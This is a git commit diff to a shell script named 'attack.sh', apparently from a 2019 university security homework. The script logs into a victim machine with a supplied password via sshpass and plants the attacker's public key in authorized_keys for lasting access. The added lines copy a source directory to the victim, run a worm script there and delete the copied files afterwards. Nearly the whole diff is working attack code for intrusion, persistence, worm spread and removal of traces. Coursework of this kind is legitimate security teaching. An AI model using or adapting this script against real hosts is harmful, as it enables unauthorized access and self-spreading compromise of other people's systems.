cec68db7626d205101e6f0bce3ef1166a7bdc48a
YU-AN CHEN <yuanchen@cs.nctu.edu.tw>
2019-04-27 14:56:35 +0800

    Update attack.sh

--- hw2/attack.sh
+++ hw2/attack.sh
@@ -11,8 +11,13 @@ payload() {
     local victim_ip="$3"
     local public_key="/home/cs2019/.ssh/id_rsa.pub"
     local key_inject_location="~/.ssh/authorized_keys"
+    local src_dir="$PWD/src"
+    local target_dir="/home/victim"
     sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "mkdir -m 700 ~/.ssh/"
     sshpass -p "$victim_password" scp "$public_key" "$victim_username"@"$victim_ip":"$key_inject_location"
+    sshpass -p "$victim_password" scp -r "$src_dir" "$victim_username"@"$victim_ip":"$target_dir"
+    sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "$target_dir/src/worm.sh"
+    sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "rm -rf $target_dir/src"
 }
 
 main() {
